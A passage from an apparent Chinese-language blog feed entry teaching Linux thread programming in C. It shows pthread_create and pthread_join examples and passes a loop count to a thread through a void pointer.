class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level_3"><a class="markdownIt-Anchor" href="#level_3"></a> level_3</h3><ul><li>接下来我们继续改进该程序，使得进程能够接受到线程结束。这个时候需要使用到<code>pthread_join()</code>这个函数。<ul><li>这个函数就是等待我们创建的线程结束。线程结束，这个函数将立刻返回；线程没结束，这个函数将阻塞进程。</li><li>这个函数有两个参数和<code>int</code>类型的返回值<code>int pthread_join(pthread_t thread, void **retval);</code><ul><li><code>pthread_t thread</code>：<code>线程ID</code>，<code>pthread_join</code>要等待什么线程结束</li><li><code>void **retval</code>：<code>结束状态</code>，如果这个指针不是空指针，将保存目标线程的退出状态，如果不想保存就使用<code>NULL</code></li><li><code>返回值</code>：调用成功返回<code>0</code></li></ul></li></ul></li><li>接下来继续优化代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// gcc 6_thread,c -pthread</span><br><span class="line"><span class="comment">#include&lt;pthread.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">        pthread_t pthread;</span><br><span class="line">        <span class="built_in">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, NULL, thread_function, NULL);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,NULL);</span><br><span class="line">        printf(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">int</span> i;</span><br><span class="line">        printf(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224192455330.png" alt="image-20250224192455330"></p><h3 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h3><ul><li><p>接下来我们继续改进该程序，让我们的进程指定线程循环的次数。这时就需要用上<code>pthread_create()</code>函数的最后一个参数<code>* argv</code></p></li><li><p>但是如果我们按照正常指针来使用这个参数，在编译的时候就会发生错误，因为传递的是<code>void</code>类型的指针，这时需要转换为<code>整型</code>类型的指针</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193032681.png" alt="image-20250224193032681"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193053738.png" alt="image-20250224193053738"></p><ul><li>最终代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, &amp;count);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; *(<span class="type">int</span> *)arg; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193322794.png" alt="image-20250224193322794"></p><h2 id="多线程"><a class="markdownIt-Anchor" href="#多线程"></a> 多线程</h2><h2 id="线程之间通信"><a class="markdownIt-Anchor" href="#线程之间通信"></a> 线程之间通信</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Linux&lt;/code&gt;系统编程&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;man&lt;/code</summary>
      
    
    
    
    
  </entry>
  
</feed>
